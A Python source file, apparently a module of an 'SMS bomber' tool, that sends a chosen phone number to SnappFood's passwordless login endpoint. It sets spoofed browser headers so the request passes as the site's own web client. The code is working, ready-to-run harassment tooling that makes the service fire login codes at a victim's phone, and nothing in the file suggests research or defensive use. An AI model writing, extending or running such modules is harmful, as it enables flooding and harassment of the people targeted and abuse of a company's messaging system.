import ssl
import certifi
import aiohttp
from bomber.services.bomber_service import BomberService


class SnappFoodService(BomberService):
    async def send_request(self, phone_number: str):
        if phone_number.startswith('+98'):
            phone_number = phone_number.replace('+98', '0')
        url = "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass"

        params = {
            'lat': '35.774',
            'long': '51.418',
            'optionalClient': 'WEBSITE',
            'client': 'WEBSITE',
            'deviceType': 'WEBSITE',
            'appVersion': '8.1.1',
            'locale': 'fa'
        }

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://snappfood.ir',
            'priority': 'u=1, i',
            'referer': 'https://snappfood.ir/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        data = {
            'cellphone': phone_number
        }

        ssl_context = ssl.create_default_context(cafile=certifi.where())
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.post(url, params=params, headers=headers, data=data) as resp:
                return resp